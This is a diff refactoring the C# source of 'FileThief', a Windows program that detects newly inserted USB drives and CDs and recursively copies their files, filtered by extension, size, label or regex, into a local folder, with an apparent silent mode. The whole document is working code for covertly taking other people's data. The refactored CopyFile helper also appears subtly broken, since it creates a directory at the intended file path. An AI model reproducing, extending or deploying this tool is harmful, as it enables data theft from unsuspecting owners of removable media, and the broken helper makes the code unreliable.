@@ -1,11 +1,9 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Diagnostics;
 using System.Globalization;
 using System.IO;
 using System.Linq;
 using System.Management;
-using System.Runtime.InteropServices;
 using System.Text;
 using System.Text.RegularExpressions;
 using System.Threading;
@@ -15,21 +13,9 @@ namespace FileThief
 {
     public partial class FrmMain : Form
     {
-        public static int debugint;
-
         public const int WmDevicechange = 0x219;
         public const int DbtDevicearrival = 0x8000;
-        public const int DbtConfigchangecanceled = 0x19;
-        public const int DbtConfigchanged = 0x18;
-        public const int DbtCustomevent = 0x8006;
-        public const int DbtDevicequeryremove = 0x8001;
-        public const int DbtDevicequeryremovefailed = 0x8002;
         public const int DbtDeviceremovecomplete = 0x8004;
-        public const int DbtDeviceremovepending = 0x8003;
-        public const int DbtDevicetypespecific = 0x8005;
-        public const int DbtDevnodesChanged = 0x7;
-        public const int DbtQuerychangeconfig = 0x17;
-        public const int DbtUserdefined = 0xFFFF;
 
         public static string UsbDrive, UsbLabel;
 
@@ -46,52 +32,15 @@ namespace FileThief
             {
                 switch (m.WParam.ToInt32())
                 {
-                    case WmDevicechange:
-                        break;
                     case DbtDevicearrival:
-                        // USB Driver Connected 
-                        /*
-                        var s = DriveInfo.GetDrives();
-                        foreach (var drive in s)
-                        {
-                            if (drive.DriveType == DriveType.Removable && drive.IsReady && ClsMain.Status)
-                            {
-                                UsbDrive = drive.Name;
-                                // If there's no volume label, use Name and Serial Number. eg: H (XXXXXXXX)
-                                UsbLabel = drive.VolumeLabel != "" ? drive.VolumeLabel : drive.Name.Replace(":\\", "") +" (" + drive.GetHashCode() + ")";
-                                if (ClsMain.ConLogInfo == "1") WriteLog("新设备接入，盘符 " + UsbDrive + ", 卷标 " + UsbLabel, 0, ClsMain.ConLogPath);
-                                var tScanFile =new Thread(StartThread);
-                                tScanFile.Start();
-                                }
-                            
-                        }*/
+                        // USB Driver Connected
                         DelegateGetDrives gdi = GetDrives;
                         IAsyncResult result = gdi.BeginInvoke(null, "");
                         gdi.EndInvoke(result);
                         break;
-                    case DbtConfigchangecanceled:
-                        break;
-                    case DbtConfigchanged:
-                        break;
-                    case DbtCustomevent:
-                        break;
-                    case DbtDevicequeryremove:
-                        break;
-                    case DbtDevicequeryremovefailed:
-                        break;
                     case DbtDeviceremovecomplete:
                         // USB Driver Disconnected
                         if (ClsMain.ConLogInfo == "1") WriteLog("设备已弹出", 0, ClsMain.ConLogPath);
-                        break;
-                    case DbtDeviceremovepending:
-                        break;
-                    case DbtDevicetypespecific:
-                        break;
-                    case DbtDevnodesChanged:
-                        break;
-                    case DbtQuerychangeconfig:
-                        break;
-                    case DbtUserdefined:
                         break;
                 }
             }
@@ -126,14 +75,14 @@ namespace FileThief
                 ClsMain.WriteIni("DriverType", "ROM", "0", ClsMain.StrConfig);
                 LoadSettings();
                 if (!Directory.Exists(Application.StartupPath + "\\Files")) Directory.CreateDirectory(Application.StartupPath + "\\Files");
-                if (!File.Exists(ClsMain.ConLogPath)) File.WriteAllText(ClsMain.ConLogPath, "FileThief 日志\n\r\n\r", Encoding.UTF8);
+                if (!File.Exists(ClsMain.ConLogPath)) File.WriteAllText(ClsMain.ConLogPath, "FileThief 日志\r\n\r\n", Encoding.UTF8);
                 if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1"){ WriteLog("FileThief 开始运行", 0, ClsMain.ConLogPath);}
             }
             else
             {
                 LoadSettings();
                 if (!Directory.Exists(ClsMain.ConPath) && ClsMain.ConPath != "") Directory.CreateDirectory(ClsMain.ConPath);
-                if (!File.Exists(ClsMain.ConLogPath)) File.WriteAllText(ClsMain.ConLogPath, "FileThief 日志\n\r\n\r", Encoding.UTF8);
+                if (!File.Exists(ClsMain.ConLogPath)) File.WriteAllText(ClsMain.ConLogPath, "FileThief 日志\r\n\r\n", Encoding.UTF8);
                 if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1") WriteLog("FileThief 开始运行", 0, ClsMain.ConLogPath);
             }
             if (ClsMain.ConSilent == "0")
@@ -150,8 +99,7 @@ namespace FileThief
 
         public void LoadSettings()
         {
-            //rar|zip|7z|doc|docx|ppt|pptx|xls|xlsx|mp3|mp4|3gp|mov|avi|dat|jpg|png|bmp
-            // Check whether copying all files or not
+            // Check whether copy all files or not
             if (ClsMain.ReadIni("FileType", "Type", "", ClsMain.StrConfig) != "")
             {
                 ClsMain.ConType = ClsMain.ReadIni("FileType", "Type", "", ClsMain.StrConfig).Split('|');
@@ -202,298 +150,16 @@ namespace FileThief
                             // Check Volume Label
                             if ((vLabel == UsbLabel && ClsMain.BLabel=="0") | (vLabel != UsbLabel && ClsMain.BLabel=="1")) 
                             {
-                                // Check whether copying all files or not
-                                if (IsAllFiles == false)
-                                {
-                                    // Check Extension Name
-                                    foreach (string exName in extension) 
-                                    {
-                                        foreach (var mFileInfo in mDirInfo.GetFiles("*." + exName).Where(f => f.Extension == "." + exName).ToList())
-                                        {
-                                            double dFileLength = mFileInfo.Length / (double) 1024;
-                                            // Check File Size
-                                            if (Math.Round(dFileLength, MidpointRounding.AwayFromZero) <=
-                                                ClsMain.ConSize) 
-                                            {
-                                                var fn = Path.GetDirectoryName(mFileInfo.FullName.Replace(
-                                                    UsbDrive.Replace("\\", ""), ClsMain.ConPath + "\\" + UsbLabel));
-                                                // Check File Name using RegExp
-                                                if (ClsMain.ConFileNameRegExp != "")
-                                                {
-                                                    Regex regex =
-                                                        new Regex(ClsMain.ConFileNameRegExp, RegexOptions.IgnoreCase);
-                                                    if (regex.IsMatch(Path.GetFileName(mFileInfo.FullName)))
-                                                    {
-                                                        MatchCollection matchCollection =
-                                                            regex.Matches(Path.GetFileName(mFileInfo.FullName));
-                                                        foreach (Match match in matchCollection)
-                                                        {
-                                                            // Check status
-                                                            if (ClsMain.Status)
-                                                            {
-                                                                // Create Directory if Not Exists
-                                                                if (!Directory.Exists(ClsMain.ConPath + "\\" + UsbLabel))
-                                                                    Directory.CreateDirectory(
-                                                                        ClsMain.ConPath + "\\" + UsbLabel);
-                                                                if (!Directory.Exists(fn)) Directory.CreateDirectory(fn);
-                                                                // Copy File
-                                                                File.Copy(mFileInfo.FullName,
-                                                                mFileInfo.FullName.Replace(UsbDrive.Replace("\\", ""),
-                                                                    ClsMain.ConPath + "\\" + UsbLabel), true);
-                                                                if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1")
-                                                                    WriteLog("已复制 " + mFileInfo.FullName, 0,
-                                                                     ClsMain.ConLogPath);
-                                                            }
-                                                        }
-                                                    }
-                                                }
-                                                else
-                                                {
-                                                    // Check status
-                                                    if (ClsMain.Status)
-                                                    {
-                                                        // Create Directory if Not Exists
-                                                    if (!Directory.Exists(ClsMain.ConPath + "\\" + UsbLabel))
-                                                        Directory.CreateDirectory(ClsMain.ConPath + "\\" + UsbLabel);
-                                                    if (!Directory.Exists(fn)) Directory.CreateDirectory(fn);
-                                                    // Copy File
-                                                    File.Copy(mFileInfo.FullName,
-                                                        mFileInfo.FullName.Replace(UsbDrive.Replace("\\", ""),
-                                                            ClsMain.ConPath + "\\" + UsbLabel),
-                                                        true);
-                                                    if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1")
-                                                        WriteLog("已复制 " + mFileInfo.FullName, 0,
-                                                            ClsMain.ConLogPath);
-                                                    }
-                                                    
-                                                }
-                                            }
-                                        }
-                                    }
-                                    foreach (DirectoryInfo mDir in mDirInfo.GetDirectories())
-                                    {
-                                        ScanFile(mDir.FullName, volumeLabel, extension, ClsMain.ConFileNameRegExp);
-                                    }
-                                }
-                                else
-                                {
-                                    foreach (var mFileInfo in mDirInfo.GetFiles())
-                                    {
-                                        double dFileLength = mFileInfo.Length / (double)1024;
-                                        if (Math.Round(dFileLength, MidpointRounding.AwayFromZero) <=
-                                            ClsMain.ConSize) // Check File Size
-                                        {
-                                            var fn = Path.GetDirectoryName(mFileInfo.FullName.Replace(
-                                                UsbDrive.Replace("\\", ""), ClsMain.ConPath + "\\" + UsbLabel));
-                                            // Check File Name using RegExp
-                                            if (ClsMain.ConFileNameRegExp != "")
-                                            {
-                                                Regex regex =
-                                                    new Regex(ClsMain.ConFileNameRegExp, RegexOptions.IgnoreCase);
-                                                if (regex.IsMatch(Path.GetFileName(mFileInfo.FullName)))
-                                                {
-                                                    MatchCollection matchCollection =
-                                                        regex.Matches(Path.GetFileName(mFileInfo.FullName));
-                                                    foreach (Match match in matchCollection)
-                                                    {
-                                                        // Check status
-                                                        if (ClsMain.Status)
-                                                        {
-                                                            // Create Directory if Not Exists
-                                                        if (!Directory.Exists(ClsMain.ConPath + "\\" + UsbLabel))
-                                                            Directory.CreateDirectory(
-                                                                ClsMain.ConPath + "\\" + UsbLabel);
-                                                        if (!Directory.Exists(fn)) Directory.CreateDirectory(fn);
-                                                        // Copy File
-                                                        File.Copy(mFileInfo.FullName,
-                                                            mFileInfo.FullName.Replace(UsbDrive.Replace("\\", ""),
-                                                                ClsMain.ConPath + "\\" + UsbLabel), true);
-                                                        if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1")  
-                                                            WriteLog("已复制 " + mFileInfo.FullName, 0,
-                                                                ClsMain.ConLogPath);
-                                                        }
-                                                    }
-                                                }
-                                                else
-                                                {
-                                                    // Check status
-                                                    if (ClsMain.Status)
-                                                    {
-                                                        // Create Directory if Not Exists
-                                                    if (!Directory.Exists(ClsMain.ConPath + "\\" + UsbLabel))
-                                                        Directory.CreateDirectory(ClsMain.ConPath + "\\" + UsbLabel);
-                                                    if (!Directory.Exists(fn)) Directory.CreateDirectory(fn);
-                                                    // Copy File
-                                                    File.Copy(mFileInfo.FullName,
-                                                        mFileInfo.FullName.Replace(UsbDrive.Replace("\\", ""),
-                                                            ClsMain.ConPath + "\\" + UsbLabel),
-                                                        true);
-                                                    if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1")
-                                                        WriteLog("已复制 " + mFileInfo.FullName, 0,
-                                                            ClsMain.ConLogPath);
-                                                    }
-                                                    
-                                                }
-                                            }
-                                        }
-                                    }
-                                    foreach (DirectoryInfo mDir in mDirInfo.GetDirectories())
-                                    {
-                                        ScanFile(mDir.FullName, volumeLabel, extension, ClsMain.ConFileNameRegExp);
-                                    }
-                                }
+                                CheckIfAllFiles(extension,driver,mDirInfo,volumeLabel);
                             }
                         }
                     }
                     else
                     {
                         // Not specified Volume Label
-                        // Check whether copying all files or not
-                        if (IsAllFiles == false)
-                        {
-                            // Check Extension Name
-                            foreach (string exName in extension)
-                            {
-                                foreach (var mFileInfo in mDirInfo.GetFiles("*." + exName).Where(f => f.Extension == "."+exName).ToList())
-                                {
-                                    double dFileLength = mFileInfo.Length / (double) 1024;
-                                    if (Math.Round(dFileLength, MidpointRounding.AwayFromZero) <=
-                                        ClsMain.ConSize) // Check File Size
-                                    {
-                                        var fn = Path.GetDirectoryName(mFileInfo.FullName.Replace(
-                                            UsbDrive.Replace("\\", ""), ClsMain.ConPath + "\\" + UsbLabel));
-                                        // Copy File
-                                        // Check File Name using RegExp
-                                        if (ClsMain.ConFileNameRegExp != "")
-                                        {
-                                            Regex regex =
-                                                new Regex(ClsMain.ConFileNameRegExp, RegexOptions.IgnoreCase);
-                                            if (regex.IsMatch(Path.GetFileName(mFileInfo.FullName)))
-                                            {
-                                                MatchCollection matchCollection =
-                                                    regex.Matches(Path.GetFileName(mFileInfo.FullName));
-                                                foreach (Match match in matchCollection)
-                                                {
-                                                    // Check status
-                                                    if (ClsMain.Status)
-                                                    {
-                                                        // Create Directory if Not Exists
-                                                    if (!Directory.Exists(ClsMain.ConPath + "\\" + UsbLabel))
-                                                        Directory.CreateDirectory(ClsMain.ConPath + "\\" + UsbLabel);
-                                                    if (!Directory.Exists(fn)) Directory.CreateDirectory(fn);
-                                                    // Copy File
-                                                    File.Copy(mFileInfo.FullName,
-                                                        mFileInfo.FullName.Replace(UsbDrive.Replace("\\", ""),
-                                                            ClsMain.ConPath + "\\" + UsbLabel),
-                                                        true);
-                                                    if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1")
-                                                        WriteLog("已复制 " + mFileInfo.FullName, 0,
-                                                            ClsMain.ConLogPath);
-                                                    }
-                                                }
-                                            }
-                                        }
-                                        else
-                                        {
-                                            // Check status
-                                            if (ClsMain.Status)
-                                            {
-                                                // Create Directory if Not Exists
-                                            if (!Directory.Exists(ClsMain.ConPath + "\\" + UsbLabel))
-                                                Directory.CreateDirectory(ClsMain.ConPath + "\\" + UsbLabel);
-                                            if (!Directory.Exists(fn)) Directory.CreateDirectory(fn);
-                                            // Copy File
-                                            {
-                                                File.Copy(mFileInfo.FullName,
-                                                    mFileInfo.FullName.Replace(UsbDrive.Replace("\\", ""),
-                                                        ClsMain.ConPath + "\\" + UsbLabel),
-                                                    true);
-                                                if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1")
-                                                {
-                                                    WriteLog("已复制 " + mFileInfo.FullName, 0, ClsMain.ConLogPath);
-                                                }
-                                            }
-                                            }
-                                        }
-                                    }
-                                }
-                            }
-                            foreach (DirectoryInfo mDir in mDirInfo.GetDirectories())
-                            {
-                                ScanFile(mDir.FullName, volumeLabel, extension, ClsMain.ConFileNameRegExp);
-                            }
-                        }
-                        else
-                        {
-                            foreach (FileInfo mFileInfo in mDirInfo.GetFiles())
-                            {
-                                double dFileLength = mFileInfo.Length / (double)1024;
-                                if (Math.Round(dFileLength, MidpointRounding.AwayFromZero) <=
-                                    ClsMain.ConSize) // Check File Size
-                                {
-                                    var fn = Path.GetDirectoryName(mFileInfo.FullName.Replace(
-                                        UsbDrive.Replace("\\", ""), ClsMain.ConPath + "\\" + UsbLabel));
-                                    // Copy File
-                                    // Check File Name using RegExp
-                                    if (ClsMain.ConFileNameRegExp != "")
-                                    {
-                                        Regex regex =
-                                            new Regex(ClsMain.ConFileNameRegExp, RegexOptions.IgnoreCase);
-                                        if (regex.IsMatch(Path.GetFileName(mFileInfo.FullName)))
-                                        {
-                                            MatchCollection matchCollection =
-                                                regex.Matches(Path.GetFileName(mFileInfo.FullName));
-                                            foreach (Match match in matchCollection)
-                                            {
-                                                if (ClsMain.Status)
-                                                {
-                                                    // Create Directory if Not Exists
-                                                if (!Directory.Exists(ClsMain.ConPath + "\\" + UsbLabel))
-                                                    Directory.CreateDirectory(ClsMain.ConPath + "\\" + UsbLabel);
-                                                if (!Directory.Exists(fn)) Directory.CreateDirectory(fn);
-                                                // Copy File
-                                                File.Copy(mFileInfo.FullName,
-                                                    mFileInfo.FullName.Replace(UsbDrive.Replace("\\", ""),
-                                                        ClsMain.ConPath + "\\" + UsbLabel),
-                                                    true);
-                                                if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1")
-                                                    WriteLog("已复制 " + mFileInfo.FullName, 0,
-                                                        ClsMain.ConLogPath);
-                                                }
-                                            }
-                                        }
-                                    }
-                                    else
-                                    {
-                                        // Check status
-                                        if (ClsMain.Status)
-                                        {
-                                            // Create Directory if Not Exists
-                                        if (!Directory.Exists(ClsMain.ConPath + "\\" + UsbLabel))
-                                            Directory.CreateDirectory(ClsMain.ConPath + "\\" + UsbLabel);
-                                        if (!Directory.Exists(fn)) Directory.CreateDirectory(fn);
-                                        // Copy File
-                                        {
-                                            File.Copy(mFileInfo.FullName,
-                                                mFileInfo.FullName.Replace(UsbDrive.Replace("\\", ""),
-                                                    ClsMain.ConPath + "\\" + UsbLabel),
-                                                true);
-                                            if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1")
-                                            {
-                                                WriteLog("已复制 " + mFileInfo.FullName, 0, ClsMain.ConLogPath);
-                                            }
-                                        }
-                                        }
-                                        
-                                    }
-                                }
-                            }
-                            foreach (DirectoryInfo mDir in mDirInfo.GetDirectories())
-                            {
-                                ScanFile(mDir.FullName, volumeLabel, extension, ClsMain.ConFileNameRegExp);
-                            }
-                        }
-                        
+                        // Check whether copy all files or not
+                        CheckIfAllFiles(extension, driver, mDirInfo, volumeLabel);
+
                     }
                 }
                 catch (Exception ex)
@@ -558,32 +224,32 @@ namespace FileThief
                 bool isUsb = usbDriveNames.Contains(d.Name.Substring(0, 2));
                 switch (d.DriveType)
                 {
-                    case DriveType.Removable:
+                    case DriveType.Removable: // Removable Drivers (except USB Hard Disk)
                         if (d.IsReady && ClsMain.ConUSBDisk=="1" && ClsMain.Status )
                             {
                             UsbDrive = d.Name;
                             // If there's no volume label, use Name and Serial Number. eg: H (XXXXXXXX)
                             UsbLabel = d.VolumeLabel != "" ? d.VolumeLabel : d.Name.Replace(":\\", "") + " (" + d.GetHashCode() + ")";
-                            if (ClsMain.ConLogInfo == "1") WriteLog("新设备接入，盘符 " + UsbDrive + ", 卷标 " + UsbLabel +" , USB 闪存盘", 0, ClsMain.ConLogPath);
+                            if (ClsMain.ConLogInfo == "1") WriteLog("新设备接入, 盘符 " + UsbDrive + ", 卷标 " + UsbLabel +", USB 闪存盘", 0, ClsMain.ConLogPath);
                             var tScanFile = new Thread(StartThread);
                             tScanFile.Start();
                         }
                         break;
                     case DriveType.Fixed:
-                        if (isUsb)
+                        if (isUsb) // USB Hard Disk
                         {
                             if (d.IsReady && ClsMain.ConUSBHD == "1" && ClsMain.Status)
                             {
                                 UsbDrive = d.Name;
                                 // If there's no volume label, use Name and Serial Number. eg: H (XXXXXXXX)
                                 UsbLabel = d.VolumeLabel != "" ? d.VolumeLabel : d.Name.Replace(":\\", "") + " (" + d.GetHashCode() + ")";
-                                if (ClsMain.ConLogInfo == "1") WriteLog("新设备接入，盘符 " + UsbDrive + ", 卷标 " + UsbLabel + " , USB 硬盘", 0, ClsMain.ConLogPath);
+                                if (ClsMain.ConLogInfo == "1") WriteLog("新设备接入, 盘符 " + UsbDrive + ", 卷标 " + UsbLabel + ", USB 硬盘", 0, ClsMain.ConLogPath);
                                 var tScanFile = new Thread(StartThread);
                                 tScanFile.Start();
                             }
                         }
                         break;
-                    case DriveType.CDRom:
+                    case DriveType.CDRom: // CD/DVD ROM
                         if (d.IsReady && ClsMain.ConROM == "1" && ClsMain.Status)
                         {
                             UsbDrive = d.Name;
@@ -601,34 +267,41 @@ namespace FileThief
         private static List<string> GetAllUsbDriveNames()
         {
             // Fuck the empty card reader!
-            // 日**的空读卡器
-            var searcher = new ManagementObjectSearcher();
-            searcher.Query = new SelectQuery("Win32_DiskDrive", "InterfaceType = \"USB\"");
-            var usbDiskDrives = searcher.Get().Cast<ManagementObject>();
             var usbDriveNames = new List<string>();
-            foreach (var usbDiskDrive in usbDiskDrives)
+            try
             {
-                searcher.Query = new SelectQuery("Win32_DiskDriveToDiskPartition");
-                var diskDriveToDiskPartition = searcher.Get().Cast<ManagementObject>();
-
-                searcher.Query = new SelectQuery("Win32_LogicalDiskToPartition");
-                var logicalDiskToPartition = searcher.Get().Cast<ManagementObject>();
-
-                searcher.Query = new SelectQuery("Win32_LogicalDisk");
-                var logicalDisk = searcher.Get().Cast<ManagementObject>();
-
-                var usbPartition =
-                    diskDriveToDiskPartition.First(p => p["Antecedent"].ToString() == usbDiskDrive.ToString())[
-                        "Dependent"].ToString();
-                var usbLogicalDisk =
-                    logicalDiskToPartition.First(p => p["Antecedent"].ToString() == usbPartition)["Dependent"].ToString();
-                foreach (ManagementObject disk in logicalDisk)
+                var searcher = new ManagementObjectSearcher();
+                searcher.Query = new SelectQuery("Win32_DiskDrive", "InterfaceType = \"USB\"");
+                var usbDiskDrives = searcher.Get().Cast<ManagementObject>();
+                foreach (var usbDiskDrive in usbDiskDrives)
                 {
-                    if (disk.ToString() == usbLogicalDisk)
+                    searcher.Query = new SelectQuery("Win32_DiskDriveToDiskPartition");
+                    var diskDriveToDiskPartition = searcher.Get().Cast<ManagementObject>();
+
+                    searcher.Query = new SelectQuery("Win32_LogicalDiskToPartition");
+                    var logicalDiskToPartition = searcher.Get().Cast<ManagementObject>();
+
+                    searcher.Query = new SelectQuery("Win32_LogicalDisk");
+                    var logicalDisk = searcher.Get().Cast<ManagementObject>();
+
+                    var usbPartition =
+                        diskDriveToDiskPartition.First(p => p["Antecedent"].ToString() == usbDiskDrive.ToString())[
+                            "Dependent"].ToString();
+                    var usbLogicalDisk =
+                        logicalDiskToPartition.First(p => p["Antecedent"].ToString() == usbPartition)["Dependent"].ToString();
+                    foreach (ManagementObject disk in logicalDisk)
                     {
-                        usbDriveNames.Add(disk["DeviceID"].ToString());
+                        if (disk.ToString() == usbLogicalDisk)
+                        {
+                            usbDriveNames.Add(disk["DeviceID"].ToString());
+                        }
                     }
                 }
+                
+            }
+            catch(Exception)
+            {
+                
             }
             return usbDriveNames;
         }
@@ -639,6 +312,117 @@ namespace FileThief
         {
             var usbDriveNames = GetAllUsbDriveNames();
             CheckAllDriveType(usbDriveNames);
+        }
+
+        public static void CopyFile(string oriFile,string saveDirectory)
+        {
+            // Create Directory if Not Exists
+            if (!Directory.Exists(ClsMain.ConPath + "\\" + UsbLabel))
+                Directory.CreateDirectory(ClsMain.ConPath + "\\" + UsbLabel);
+            if (!Directory.Exists(saveDirectory)) Directory.CreateDirectory(saveDirectory);
+            // Copy File
+            File.Copy(oriFile, oriFile.Replace(UsbDrive.Replace("\\", ""),
+                ClsMain.ConPath + "\\" + UsbLabel), true);
+            if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1")
+                WriteLog("已复制 " + oriFile, 0, ClsMain.ConLogPath);
+        }
+
+        public static void CheckRegExp(string fullName)
+        {
+            Regex regex = new Regex(ClsMain.ConFileNameRegExp, RegexOptions.IgnoreCase);
+            if (regex.IsMatch(Path.GetFileName(fullName)))
+            {
+                MatchCollection matchCollection = regex.Matches(Path.GetFileName(fullName));
+                foreach (Match match in matchCollection)
+                {
+                    // Check status
+                    if (ClsMain.Status)
+                    {
+                        CopyFile(fullName, fullName.Replace(UsbDrive.Replace("\\", ""),
+                            ClsMain.ConPath + "\\" + UsbLabel));
+                    }
+                }
+            }
+        }
+
+        public static void CheckExtensionName(string[] extension, string driver)
+        {
+            var mDirInfo = new DirectoryInfo(driver);
+            foreach (string exName in extension)
+            {
+                foreach (var mFileInfo in mDirInfo.GetFiles("*." + exName).Where(f => f.Extension == "." + exName).ToList())
+                {
+                    double dFileLength = mFileInfo.Length / (double)1024;
+                    // Check File Size
+                    if (Math.Round(dFileLength, MidpointRounding.AwayFromZero) <=
+                        ClsMain.ConSize)
+                    {
+                        var fn = Path.GetDirectoryName(mFileInfo.FullName.Replace(
+                            UsbDrive.Replace("\\", ""), ClsMain.ConPath + "\\" + UsbLabel));
+                        // Check File Name using RegExp
+                        if (ClsMain.ConFileNameRegExp != "")
+                        {
+                            CheckRegExp(mFileInfo.FullName);
+                        }
+                        else
+                        {
+                            // Check status
+                            if (ClsMain.Status)
+                            {
+                                CopyFile(mFileInfo.FullName, mFileInfo.FullName.Replace(UsbDrive.Replace("\\", ""),
+                                    ClsMain.ConPath + "\\" + UsbLabel));
+                            }
+
+                        }
+                    }
+                }
+            }
+        }
+
+        public static void CheckIfAllFiles(string[] extension, string driver,DirectoryInfo mDirInfo,string[] volumeLabel)
+        {
+            // Check whether copy all files or not
+            if (IsAllFiles == false)
+            {
+                // Check Extension Name
+                CheckExtensionName(extension, driver);
+                foreach (DirectoryInfo mDir in mDirInfo.GetDirectories())
+                {
+                    ScanFile(mDir.FullName, volumeLabel, extension, ClsMain.ConFileNameRegExp);
+                }
+            }
+            else
+            {
+                foreach (var mFileInfo in mDirInfo.GetFiles())
+                {
+                    double dFileLength = mFileInfo.Length / (double)1024;
+                    if (Math.Round(dFileLength, MidpointRounding.AwayFromZero) <=
+                        ClsMain.ConSize) // Check File Size
+                    {
+                        var fn = Path.GetDirectoryName(mFileInfo.FullName.Replace(
+                            UsbDrive.Replace("\\", ""), ClsMain.ConPath + "\\" + UsbLabel));
+                        // Check File Name using RegExp
+                        if (ClsMain.ConFileNameRegExp != "")
+                        {
+                            CheckRegExp(mFileInfo.FullName);
+                        }
+                        else
+                        {
+                            // Check status
+                            if (ClsMain.Status)
+                            {
+                                CopyFile(mFileInfo.FullName, mFileInfo.FullName.Replace(UsbDrive.Replace("\\", ""),
+                                    ClsMain.ConPath + "\\" + UsbLabel));
+                            }
+                        }
+
+                    }
+                }
+                foreach (DirectoryInfo mDir in mDirInfo.GetDirectories())
+                {
+                    ScanFile(mDir.FullName, volumeLabel, extension, ClsMain.ConFileNameRegExp);
+                }
+            }
         }
     }
 }
